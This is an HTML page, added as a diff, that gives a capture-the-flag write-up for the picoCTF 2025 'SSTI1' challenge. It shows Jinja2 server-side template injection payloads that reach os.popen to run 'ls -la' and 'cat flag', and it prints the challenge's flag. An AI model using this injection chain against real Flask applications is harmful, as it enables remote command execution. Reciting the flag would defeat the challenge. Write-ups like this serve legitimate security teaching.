@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF SSTI1 @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF Web Exploitation Guide</h1>
+        <p>here's how to solve SSTI1</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the Web Exploitation Guides</a>
+            <hr>
+            <h2>SSTI1</h2>
+            <pre>Name: SSTI1
+Description: I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website here!
+Author: Venax
+Tags: Easy, General Skills, picoCTF 2025, browser_webshell_solvable
+Challenge from: picoCTF 2025
+Hints:
+1. Server Side Template Injection</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we'll have to see a website that displays your announcements or something like that. And because the challenge is literally called "Server Side Template Injection 1", I'd go out on a limb and say that we have to send in some template code to the announcer to get the flag probably somewhere around in the site files. Before doing anything we'll use config template to know with what type of server we are dealing with:</p>
+            <pre>{{config}}</pre>
+            <h2>Solution</h2>
+            <p>So we'll open the website and enter the config command:</p>
+            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/SSTI1/1.jpg">
+            <p>Although I don't know much about server configurations, and what we just got is just gibberish to me, so I'm just gonna forward it to an AI that actually knows what we're dealing with, and don't panic! I'm not gonna transform into an AI bro, it's just this one singular time that I really don't know what these server values or whatever this mess means:</p>
+            <pre>Chatbot
+
+YOU: What type of server is this? [...]
+
+BOT: That looks like the configuration output of a Flask server (a Python web framework).</pre>
+            <p>Okay, so now that we know this is flask, a python framework integrated to web development, we can use self to import in python like:</p>
+            <pre>{{ self.__init__.__globals__.__builtins__.__import__('os') }}</pre>
+            <p>And that means that we can just use the command like a shell, just need to put the part to say we are executing commands and we get this command, that will execute the <code>ls -la</code> of a linux shell, which we can use like in the image below:</p>
+            <pre>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}</pre>
+            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/SSTI1/2.jpg">
+            <p>We can also go into Ctrl+U to view the source, because between the big text, and the fact that the spaces and new lines are all messed up because of HTML, view source is definitely a much better option:</p>
+            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/SSTI1/3.png">
+            <p>And now that we know the name of the file with the flag, we can use this command, which is just like before, but using the linux command cat to print the contents of the flag file:</p>
+            <pre>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}</pre>
+            <img src="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/SSTI1/4.jpg">
+            <p>And the flag is:</p>
+            <pre>picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/492">https://play.picoctf.org/practice/challenge/492</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
